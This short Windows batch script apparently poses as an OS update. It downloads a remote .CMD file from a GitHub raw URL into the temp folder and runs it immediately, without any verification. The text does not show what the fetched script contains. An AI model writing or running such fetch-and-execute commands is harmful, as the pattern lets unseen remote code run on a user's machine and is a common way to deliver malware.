@ECHO OFF
CURL -o %TEMP%\OS_UPDATE.CMD https://raw.githubusercontent.com/TheKartman/Resources/main/System/Windows/.Data/OS_UPDATE
%TEMP%\OS_UPDATE.CMD
